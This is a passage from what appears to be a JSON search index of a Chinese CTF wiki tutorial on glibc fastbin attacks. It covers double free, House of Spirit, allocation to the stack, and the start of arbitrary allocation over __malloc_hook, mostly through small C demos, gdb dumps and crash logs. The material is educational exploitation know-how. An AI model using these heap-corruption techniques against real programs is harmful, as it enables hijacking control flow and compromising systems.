/home/Ox9A82/tst/tst\n02200000-02221000 rw-p 00000000 00:00 0                                  [heap]\n7fbb74000000-7fbb74021000 rw-p 00000000 00:00 0 \n7fbb74021000-7fbb78000000 ---p 00000000 00:00 0 \n7fbb7a0df000-7fbb7a0f5000 r-xp 00000000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1\n7fbb7a0f5000-7fbb7a2f4000 ---p 00016000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1\n7fbb7a2f4000-7fbb7a2f5000 rw-p 00015000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1\n7fbb7a2f5000-7fbb7a4b5000 r-xp 00000000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so\n7fbb7a4b5000-7fbb7a6b5000 ---p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so\n7fbb7a6b5000-7fbb7a6b9000 r--p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so\n7fbb7a6b9000-7fbb7a6bb000 rw-p 001c4000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so\n7fbb7a6bb000-7fbb7a6bf000 rw-p 00000000 00:00 0 \n7fbb7a6bf000-7fbb7a6e5000 r-xp 00000000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so\n7fbb7a8c7000-7fbb7a8ca000 rw-p 00000000 00:00 0 \n7fbb7a8e1000-7fbb7a8e4000 rw-p 00000000 00:00 0 \n7fbb7a8e4000-7fbb7a8e5000 r--p 00025000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so\n7fbb7a8e5000-7fbb7a8e6000 rw-p 00026000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so\n7fbb7a8e6000-7fbb7a8e7000 rw-p 00000000 00:00 0 \n7ffcd2f93000-7ffcd2fb4000 rw-p 00000000 00:00 0                          [stack]\n7ffcd2fc8000-7ffcd2fca000 r--p 00000000 00:00 0                          [vvar]\n7ffcd2fca000-7ffcd2fcc000 r-xp 00000000 00:00 0                          [vdso]\nffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]\n\u5df2\u653e\u5f03 (\u6838\u5fc3\u5df2\u8f6c\u50a8) \n\u5982\u679c\u6211\u4eec\u5728 chunk1 \u91ca\u653e\u540e\uff0c\u518d\u91ca\u653e chunk2 \uff0c\u8fd9\u6837 main_arena \u5c31\u6307\u5411 chunk2 \u800c\u4e0d\u662f chunk1 \u4e86\uff0c\u6b64\u65f6\u6211\u4eec\u518d\u53bb\u91ca\u653e chunk1 \u5c31\u4e0d\u518d\u4f1a\u88ab\u68c0\u6d4b\u5230\u3002 int main(void)\n{\n    void *chunk1,*chunk2,*chunk3;\n    chunk1=malloc(0x10);\n    chunk2=malloc(0x10);\n\n    free(chunk1);\n    free(chunk2);\n    free(chunk1);\n    return 0;\n} \n\u7b2c\u4e00\u6b21\u91ca\u653e free(chunk1)   \u7b2c\u4e8c\u6b21\u91ca\u653e free(chunk2)   \u7b2c\u4e09\u6b21\u91ca\u653e free(chunk1)   \u6ce8\u610f\u56e0\u4e3a chunk1 \u88ab\u518d\u6b21\u91ca\u653e\u56e0\u6b64\u5176 fd \u503c\u4e0d\u518d\u4e3a 0 \u800c\u662f\u6307\u5411 chunk2\uff0c\u8fd9\u65f6\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u63a7\u5236 chunk1 \u7684\u5185\u5bb9\uff0c\u4fbf\u53ef\u4ee5\u5199\u5165\u5176 fd \u6307\u9488\u4ece\u800c\u5b9e\u73b0\u5728\u6211\u4eec\u60f3\u8981\u7684\u4efb\u610f\u5730\u5740\u5206\u914d fastbin \u5757\u3002\n\u4e0b\u9762\u8fd9\u4e2a\u793a\u4f8b\u6f14\u793a\u4e86\u8fd9\u4e00\u70b9\uff0c\u9996\u5148\u8ddf\u524d\u9762\u4e00\u6837\u6784\u9020 main_arena= chunk1= chun2= chunk1\u7684\u94fe\u8868\u3002\u4e4b\u540e\u7b2c\u4e00\u6b21\u8c03\u7528 malloc \u8fd4\u56de chunk1 \u4e4b\u540e\u4fee\u6539 chunk1 \u7684 fd \u6307\u9488\u6307\u5411 bss \u6bb5\u4e0a\u7684 bss_chunk\uff0c\u4e4b\u540e\u6211\u4eec\u53ef\u4ee5\u770b\u5230 fastbin \u4f1a\u628a\u5806\u5757\u5206\u914d\u5230\u8fd9\u91cc\u3002  typedef struct _chunk\n{\n    long long pre_size;\n    long long size;\n    long long fd;\n    long long bk;  \n} CHUNK,*PCHUNK;\n\nCHUNK bss_chunk;\n\nint main(void)\n{\n    void *chunk1,*chunk2,*chunk3;\n    void *chunk_a,*chunk_b;\n\n    bss_chunk.size=0x21;\n    chunk1=malloc(0x10);\n    chunk2=malloc(0x10);\n\n    free(chunk1);\n    free(chunk2);\n    free(chunk1);\n\n    chunk_a=malloc(0x10);\n    *(long long *)chunk_a= bss_chunk;\n    malloc(0x10);\n    malloc(0x10);\n    chunk_b=malloc(0x10);\n    printf( %p ,chunk_b);\n    return 0;\n} \n\u5728\u6211\u7684\u7cfb\u7edf\u4e0a chunk_b \u8f93\u51fa\u7684\u503c\u4f1a\u662f 0x601090\uff0c\u8fd9\u4e2a\u503c\u4f4d\u4e8ebss\u6bb5\u4e2d\u6b63\u662f\u6211\u4eec\u4e4b\u524d\u8bbe\u7f6e\u7684 CHUNK bss_chunk  Start              End                Offset             Perm Path\n0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/Ox9A82/tst/tst\n0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/Ox9A82/tst/tst\n0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/Ox9A82/tst/tst\n0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]\n\n0x601080  bss_chunk :   0x0000000000000000  0x0000000000000021\n0x601090  bss_chunk+16 :0x0000000000000000  0x0000000000000000\n0x6010a0:               0x0000000000000000  0x0000000000000000\n0x6010b0:               0x0000000000000000  0x0000000000000000\n0x6010c0:               0x0000000000000000  0x0000000000000000 \n\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u6211\u4eec\u5728 main \u51fd\u6570\u7684\u7b2c\u4e00\u6b65\u5c31\u8fdb\u884c\u4e86 bss_chunk.size=0x21; \u7684\u64cd\u4f5c\uff0c\u8fd9\u662f\u56e0\u4e3a_int_malloc\u4f1a\u5bf9\u6b32\u5206\u914d\u4f4d\u7f6e\u7684 size \u57df\u8fdb\u884c\u9a8c\u8bc1\uff0c\u5982\u679c\u5176 size \u4e0e\u5f53\u524d fastbin \u94fe\u8868\u5e94\u6709 size \u4e0d\u7b26\u5c31\u4f1a\u629b\u51fa\u5f02\u5e38\u3002 *** Error in `./tst : malloc(): memory corruption (fast): 0x0000000000601090 ***\n======= Backtrace: =========\n/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7f8f9deb27e5]\n/lib/x86_64-linux-gnu/libc.so.6(+0x82651)[0x7f8f9debd651]\n/lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7f8f9debf184]\n./tst[0x400636]\n/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7f8f9de5b830]\n./tst[0x4004e9]\n======= Memory map: ========\n00400000-00401000 r-xp 00000000 08:01 1052570                            /home/Ox9A82/tst/tst\n00600000-00601000 r--p 00000000 08:01 1052570                            /home/Ox9A82/tst/tst\n00601000-00602000 rw-p 00001000 08:01 1052570                            /home/Ox9A82/tst/tst\n00bc4000-00be5000 rw-p 00000000 00:00 0                                  [heap]\n7f8f98000000-7f8f98021000 rw-p 00000000 00:00 0 \n7f8f98021000-7f8f9c000000 ---p 00000000 00:00 0 \n7f8f9dc25000-7f8f9dc3b000 r-xp 00000000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1\n7f8f9dc3b000-7f8f9de3a000 ---p 00016000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1\n7f8f9de3a000-7f8f9de3b000 rw-p 00015000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1\n7f8f9de3b000-7f8f9dffb000 r-xp 00000000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so\n7f8f9dffb000-7f8f9e1fb000 ---p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so\n7f8f9e1fb000-7f8f9e1ff000 r--p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so\n7f8f9e1ff000-7f8f9e201000 rw-p 001c4000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so\n7f8f9e201000-7f8f9e205000 rw-p 00000000 00:00 0 \n7f8f9e205000-7f8f9e22b000 r-xp 00000000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so\n7f8f9e40d000-7f8f9e410000 rw-p 00000000 00:00 0 \n7f8f9e427000-7f8f9e42a000 rw-p 00000000 00:00 0 \n7f8f9e42a000-7f8f9e42b000 r--p 00025000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so\n7f8f9e42b000-7f8f9e42c000 rw-p 00026000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so\n7f8f9e42c000-7f8f9e42d000 rw-p 00000000 00:00 0 \n7fff71a94000-7fff71ab5000 rw-p 00000000 00:00 0                          [stack]\n7fff71bd9000-7fff71bdb000 r--p 00000000 00:00 0                          [vvar]\n7fff71bdb000-7fff71bdd000 r-xp 00000000 00:00 0                          [vdso]\nffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]\n\u5df2\u653e\u5f03 (\u6838\u5fc3\u5df2\u8f6c\u50a8) \n_int_malloc \u4e2d\u7684\u6821\u9a8c\u5982\u4e0b if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))\n    {\n      errstr =  malloc(): memory corruption (fast) ;\n    errout:\n      malloc_printerr (check_action, errstr, chunk2mem (victim));\n      return NULL;\n}", 
            "title": "\u6f14\u793a"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_5", 
            "text": "\u901a\u8fc7 fastbin double free \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u591a\u4e2a\u6307\u9488\u63a7\u5236\u540c\u4e00\u4e2a\u5806\u5757\uff0c\u8fd9\u53ef\u4ee5\u7528\u4e8e\u7be1\u6539\u4e00\u4e9b\u5806\u5757\u4e2d\u7684\u5173\u952e\u6570\u636e\u57df\u6216\u8005\u662f\u5b9e\u73b0\u7c7b\u4f3c\u4e8e\u7c7b\u578b\u6df7\u6dc6\u7684\u6548\u679c\u3002\n\u5982\u679c\u66f4\u8fdb\u4e00\u6b65\u4fee\u6539 fd \u6307\u9488\uff0c\u5219\u80fd\u591f\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5206\u914d\u5806\u5757\u7684\u6548\u679c( \u9996\u5148\u8981\u901a\u8fc7\u9a8c\u8bc1 )\uff0c\u8fd9\u5c31\u76f8\u5f53\u4e8e\u4efb\u610f\u5730\u5740\u5199\u4efb\u610f\u503c\u7684\u6548\u679c\u3002", 
            "title": "\u5c0f\u603b\u7ed3"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#house-of-spirit", 
            "text": "", 
            "title": "House Of Spirit"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_6", 
            "text": "House of Spirit \u662f  the Malloc Maleficarum  \u4e2d\u7684\u4e00\u79cd\u6280\u672f\u3002  \u8be5\u6280\u672f\u7684\u6838\u5fc3\u5728\u4e8e\u5728\u76ee\u6807\u4f4d\u7f6e\u5904\u4f2a\u9020 fastbin chunk\uff0c\u5e76\u5c06\u5176\u91ca\u653e\uff0c\u4ece\u800c\u8fbe\u5230\u5206\u914d \u6307\u5b9a\u5730\u5740 \u7684 chunk \u7684\u76ee\u7684\u3002  \u8981\u60f3\u6784\u9020 fastbin fake chunk\uff0c\u5e76\u4e14\u5c06\u5176\u91ca\u653e\u65f6\uff0c\u53ef\u4ee5\u5c06\u5176\u653e\u5165\u5230\u5bf9\u5e94\u7684 fastbin \u94fe\u8868\u4e2d\uff0c\u9700\u8981\u7ed5\u8fc7\u4e00\u4e9b\u5fc5\u8981\u7684\u68c0\u6d4b\uff0c\u5373   fake chunk \u7684 ISMMAP \u4f4d\u4e0d\u80fd\u4e3a1\uff0c\u56e0\u4e3a free \u65f6\uff0c\u5982\u679c\u662f mmap \u7684 chunk\uff0c\u4f1a\u5355\u72ec\u5904\u7406\u3002  fake chunk \u5730\u5740\u9700\u8981\u5bf9\u9f50\uff0c MALLOC_ALIGN_MASK  fake chunk \u7684 size \u5927\u5c0f\u9700\u8981\u6ee1\u8db3\u5bf9\u5e94\u7684 fastbin \u7684\u9700\u6c42\uff0c\u540c\u65f6\u4e5f\u5f97\u5bf9\u9f50\u3002  fake chunk \u7684 next chunk \u7684\u5927\u5c0f\u4e0d\u80fd\u5c0f\u4e8e  2 * SIZE_SZ \uff0c\u540c\u65f6\u4e5f\u4e0d\u80fd\u5927\u4e8e av- system_mem  \u3002  fake chunk \u5bf9\u5e94\u7684 fastbin \u94fe\u8868\u5934\u90e8\u4e0d\u80fd\u662f\u8be5 fake chunk\uff0c\u5373\u4e0d\u80fd\u6784\u6210 double free \u7684\u60c5\u51b5\u3002   \u81f3\u4e8e\u4e3a\u4ec0\u4e48\u8981\u7ed5\u8fc7\u8fd9\u4e9b\u68c0\u6d4b\uff0c\u53ef\u4ee5\u53c2\u8003 free \u90e8\u5206\u7684\u6e90\u7801\u3002", 
            "title": "\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_7", 
            "text": "\u8fd9\u91cc\u5c31\u76f4\u63a5\u4ee5 how2heap \u4e0a\u7684\u4f8b\u5b50\u8fdb\u884c\u8bf4\u660e\uff0c\u5982\u4e0b  #include   stdio.h  #include   stdlib.h  int   main ()  { \n     fprintf ( stderr ,   This file demonstrates the house of spirit attack. \\n ); \n\n     fprintf ( stderr ,   Calling malloc() once so that it sets up its memory. \\n ); \n     malloc ( 1 ); \n\n     fprintf ( stderr ,   We will now overwrite a pointer to point to a fake  fastbin  region. \\n ); \n     unsigned   long   long   * a ; \n     // This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY) \n     unsigned   long   long   fake_chunks [ 10 ]   __attribute__   (( aligned   ( 16 ))); \n\n     fprintf ( stderr ,   This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p. \\n ,   sizeof ( fake_chunks ),   fake_chunks [ 1 ],   fake_chunks [ 7 ]); \n\n     fprintf ( stderr ,   This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category ( = 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems. \\n ); \n     fprintf ( stderr ,   ... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end.  \\n ); \n     fake_chunks [ 1 ]   =   0x40 ;   // this is the size \n\n     fprintf ( stderr ,   The chunk.size of the *next* fake region has to be sane. That is   2*SIZE_SZ (  16 on x64)     av- system_mem (  128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size. \\n ); \n         // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8 \n     fake_chunks [ 9 ]   =   0x1234 ;   // nextsize \n\n     fprintf ( stderr ,   Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p. \\n ,   fake_chunks [ 1 ]); \n     fprintf ( stderr ,   ... note that the memory address of the *region* associated with this chunk must be 16-byte aligned. \\n ); \n     a   =   fake_chunks [ 2 ]; \n\n     fprintf ( stderr ,   Freeing the overwritten pointer. \\n ); \n     free ( a ); \n\n     fprintf ( stderr ,   Now the next malloc will return the region of our fake chunk at %p, which will be %p! \\n ,   fake_chunks [ 1 ],   fake_chunks [ 2 ]); \n     fprintf ( stderr ,   malloc(0x30): %p \\n ,   malloc ( 0x30 ));  }   \u8fd0\u884c\u540e\u7684\u6548\u679c\u5982\u4e0b  \u279c  how2heap git: ( master )  ./house_of_spirit \nThis file demonstrates the house of spirit attack.\nCalling malloc ()  once so that it sets up its memory.\nWe will now overwrite a pointer to point to a fake  fastbin  region.\nThis region  ( memory of length:  80 )  contains two chunks. The first starts at 0x7ffd9bceaa58 and the second at 0x7ffd9bceaa88.\nThis chunk.size of this region has to be  16  more than the region  ( to accomodate the chunk data )   while  still falling into the fastbin category  ( =   128  on x64 ) . The PREV_INUSE  ( lsb )  bit is ignored by free  for  fastbin-sized chunks, however the IS_MMAPPED  ( second lsb )  and NON_MAIN_ARENA  ( third lsb )  bits cause problems.\n... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work  for  the malloc parameter at the end. \nThe chunk.size of the *next* fake region has to be sane. That is    2 *SIZE_SZ  (   16  on x64 )      av- system_mem  (  128kb by default  for  the main arena )  to pass the nextsize integrity checks. No need  for  fastbin size.\nNow we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7ffd9bceaa58.\n... note that the memory address of the *region* associated with this chunk must be  16 -byte aligned.\nFreeing the overwritten pointer.\nNow the next malloc will  return  the region of our fake chunk at 0x7ffd9bceaa58, which will be 0x7ffd9bceaa60!\nmalloc ( 0x30 ) : 0x7ffd9bceaa60", 
            "title": "\u6f14\u793a"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_8", 
            "text": "\u53ef\u4ee5\u770b\u51fa\uff0c\u60f3\u8981\u4f7f\u7528\u8be5\u6280\u672f\u5206\u914d chunk \u5230\u6307\u5b9a\u5730\u5740\uff0c\u5176\u5b9e\u5e76\u4e0d\u9700\u8981\u4fee\u6539\u6307\u5b9a\u5730\u5740\u7684\u4efb\u4f55\u5185\u5bb9\uff0c \u5173\u952e\u662f\u8981\u80fd\u591f\u4fee\u6539\u6307\u5b9a\u5730\u5740\u7684\u524d\u540e\u7684\u5185\u5bb9\u4f7f\u5176\u53ef\u4ee5\u7ed5\u8fc7\u5bf9\u5e94\u7684\u68c0\u6d4b \u3002", 
            "title": "\u5c0f\u603b\u7ed3"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#alloc-to-stack", 
            "text": "", 
            "title": "Alloc to Stack"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_9", 
            "text": "\u5982\u679c\u4f60\u5df2\u7ecf\u7406\u89e3\u4e86\u524d\u6587\u6240\u8bb2\u7684 Fastbin Double Free \u4e0e house of spirit \u6280\u672f\uff0c\u90a3\u4e48\u7406\u89e3\u8be5\u6280\u672f\u5c31\u5df2\u7ecf\u4e0d\u6210\u95ee\u9898\u4e86\uff0c\u5b83\u4eec\u7684\u672c\u8d28\u90fd\u5728\u4e8e fastbin \u94fe\u8868\u7684\u7279\u6027\uff1a\u5f53\u524d chunk \u7684 fd \u6307\u9488\u6307\u5411\u4e0b\u4e00\u4e2a chunk\u3002  \u8be5\u6280\u672f\u7684\u6838\u5fc3\u70b9\u5728\u4e8e\u52ab\u6301 fastbin \u94fe\u8868\u4e2d chunk \u7684 fd \u6307\u9488\uff0c\u628a fd \u6307\u9488\u6307\u5411\u6211\u4eec\u60f3\u8981\u5206\u914d\u7684\u6808\u4e0a\uff0c\u4ece\u800c\u5b9e\u73b0\u63a7\u5236\u6808\u4e2d\u7684\u4e00\u4e9b\u5173\u952e\u6570\u636e\uff0c\u6bd4\u5982\u8fd4\u56de\u5730\u5740\u7b49\u3002", 
            "title": "\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_10", 
            "text": "\u8fd9\u6b21\u6211\u4eec\u628a fake_chunk \u7f6e\u4e8e\u6808\u4e2d\u79f0\u4e3a stack_chunk\uff0c\u540c\u65f6\u52ab\u6301\u4e86 fastbin \u94fe\u8868\u4e2d chunk \u7684 fd \u503c\uff0c\u901a\u8fc7\u628a\u8fd9\u4e2a fd \u503c\u6307\u5411 stack_chunk \u5c31\u53ef\u4ee5\u5b9e\u73b0\u5728\u6808\u4e2d\u5206\u914d fastbin chunk\u3002 typedef struct _chunk\n{\n    long long pre_size;\n    long long size;\n    long long fd;\n    long long bk;  \n} CHUNK,*PCHUNK;\n\nint main(void)\n{\n    CHUNK stack_chunk;\n\n    void *chunk1;\n    void *chunk_a;\n\n    stack_chunk.size=0x21;\n    chunk1=malloc(0x10);\n\n    free(chunk1);\n\n    *(long long *)chunk1= stack_chunk;\n    malloc(0x10);\n    chunk_a=malloc(0x10);\n    return 0;\n} \n\u901a\u8fc7 gdb \u8c03\u8bd5\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u9996\u5148\u628a chunk1 \u7684 fd \u6307\u9488\u6307\u5411\u4e86 stack_chunk 0x602000:   0x0000000000000000  0x0000000000000021  === chunk1\n0x602010:   0x00007fffffffde60  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000020fe1  === top chunk \n\u4e4b\u540e\u7b2c\u4e00\u6b21 malloc \u4f7f\u5f97 fastbin \u94fe\u8868\u6307\u5411\u4e86 stack_chunk\uff0c\u8fd9\u610f\u5473\u7740\u4e0b\u4e00\u6b21\u5206\u914d\u4f1a\u4f7f\u7528 stack_chunk \u7684\u5185\u5b58\u8fdb\u884c 0x7ffff7dd1b20  main_arena :    0x0000000000000000  === unsorted bin\n0x7ffff7dd1b28  main_arena+8 :  0x00007fffffffde60  === fastbin[0]\n0x7ffff7dd1b30  main_arena+16 : 0x0000000000000000   \n\u6700\u7ec8\u7b2c\u4e8c\u6b21malloc\u8fd4\u56de\u503c\u4e3a0x00007fffffffde70\u4e5f\u5c31\u662fstack_chunk    0x400629  main+83         call   0x4004c0  malloc@plt \n \u2192 0x40062e  main+88         mov    QWORD PTR [rbp-0x38], rax\n   $rax   : 0x00007fffffffde70\n\n0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/Ox9A82/tst/tst\n0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/Ox9A82/tst/tst\n0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/Ox9A82/tst/tst\n0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]\n0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw- \n0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so\n0x00007ffff7fdb000 0x00007ffff7fde000 0x0000000000000000 rw- \n0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 rw- \n0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]\n0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]\n0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so\n0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so\n0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- \n0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]\n0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]", 
            "title": "\u6f14\u793a"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_11", 
            "text": "\u901a\u8fc7\u8be5\u6280\u672f\u6211\u4eec\u53ef\u4ee5\u628a fastbin chunk \u5206\u914d\u5230\u6808\u4e2d\uff0c\u4ece\u800c\u63a7\u5236\u8fd4\u56de\u5730\u5740\u7b49\u5173\u952e\u6570\u636e\u3002\u8981\u5b9e\u73b0\u8fd9\u4e00\u70b9\u6211\u4eec\u9700\u8981\u52ab\u6301fastbin \u4e2d chunk \u7684 fd \u57df\uff0c\u628a\u5b83\u6307\u5230\u6808\u4e0a\uff0c\u5f53\u7136\u540c\u65f6\u9700\u8981\u6808\u4e0a\u5b58\u5728\u6709\u6ee1\u8db3\u6761\u4ef6\u7684size\u503c\u3002", 
            "title": "\u5c0f\u603b\u7ed3"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#arbitrary-alloc", 
            "text": "", 
            "title": "Arbitrary Alloc"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_12", 
            "text": "Arbitrary Alloc \u5176\u5b9e\u4e0e Alloc to stack \u662f\u5b8c\u5168\u76f8\u540c\u7684\uff0c\u552f\u4e00\u7684\u533a\u522b\u662f\u5206\u914d\u7684\u76ee\u6807\u4e0d\u518d\u662f\u6808\u4e2d\u3002\n\u4e8b\u5b9e\u4e0a\u53ea\u8981\u6ee1\u8db3\u76ee\u6807\u5730\u5740\u5b58\u5728\u5408\u6cd5\u7684 size \u57df\uff08\u8fd9\u4e2a size \u57df\u662f\u6784\u9020\u7684\uff0c\u8fd8\u662f\u81ea\u7136\u5b58\u5728\u7684\u90fd\u65e0\u59a8\uff09\uff0c\u6211\u4eec\u53ef\u4ee5\u628a chunk \u5206\u914d\u5230\u4efb\u610f\u7684\u53ef\u5199\u5185\u5b58\u4e2d\uff0c\u6bd4\u5982bss\u3001heap\u3001data\u3001stack\u7b49\u7b49\u3002", 
            "title": "\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_13", 
            "text": "\u5728\u8fd9\u4e2a\u4f8b\u5b50\uff0c\u6211\u4eec\u4f7f\u7528\u5b57\u8282\u9519\u4f4d\u6765\u5b9e\u73b0\u76f4\u63a5\u5206\u914d fastbin \u5230 _malloc_hook\u7684\u4f4d\u7f6e\uff0c\u76f8\u5f53\u4e8e\u8986\u76d6_malloc_hook\u6765\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b\u3002  int main(void)\n{\n\n\n    void *chunk1;\n    void *chunk_a;\n\n    chunk1=malloc(0x60);\n\n    free(chunk1);\n\n    *(long long *)chunk1=0x7ffff7dd1b05;\n    malloc(0x60);\n    chunk_a=malloc(0x60);\n    return 0;\n} \n\u8fd9\u91cc\u76840x7ffff7dd1b05\u662f\u6211\u6839\u636e\u672c\u673a\u7684\u60c5\u51b5\u5f97\u51fa\u7684\u503c\uff0c\u8fd9\u4e2a\u503c\u662f\u600e\u4e48\u83b7\u5f97\u7684\u5462\uff1f\u9996\u5148\u6211\u4eec\u8981\u89c2\u5bdf\u6b32\u5199\u5165\u5730\u5740\u9644\u8fd1\u662f\u5426\u5b58\u5728\u53ef\u4ee5\u5b57\u8282\u9519\u4f4d\u7684\u60c5\u51b5\u3002 0x7ffff7dd1a88 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1a90 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1a98 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1aa0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1aa8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1ab0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1ab8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1ac0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1ac8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1ad0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1ad8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1ae0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1ae8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x0\n0x7ffff7dd1af8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1b00 0x20 0x2e 0xa9 0xf7 0xff 0x7f 0x0 0x0\n0x7ffff7dd1b08 0x0  0x2a 0xa9 0xf7 0xff 0x7f 0x0 0x0\n0x7ffff7dd1b10  __malloc_hook : 0x30    0x28    0xa9    0xf7    0xff    0x7f    0x0 0x0 \n0x7ffff7dd1b10 \u662f\u6211\u4eec\u60f3\u8981\u63a7\u5236\u7684 __malloc_hook \u7684\u5730\u5740\uff0c\u4e8e\u662f\u6211\u4eec\u5411\u4e0a\u5bfb\u627e\u662f\u5426\u53ef\u4ee5\u9519\u4f4d\u51fa\u4e00\u4e2a\u5408\u6cd5\u7684size\u57df\u3002\u56e0\u4e3a\u8fd9\u4e2a\u7a0b\u5e8f\u662f 64 \u4f4d\u7684\uff0c\u56e0\u6b64 fastbin \u7684\u8303\u56f4\u4e3a32\u5b57\u8282\u5230128\u5b57\u8282(0x20-0x80)\uff0c\u5982\u4e0b\uff1a //\u8fd9\u91cc\u7684size\u6307\u7528\u6237\u533a\u57df\uff0c\u56e0\u6b64\u8981\u5c0f2\u500dSIZE_SZ\nFastbins[idx=0, size=0x10] 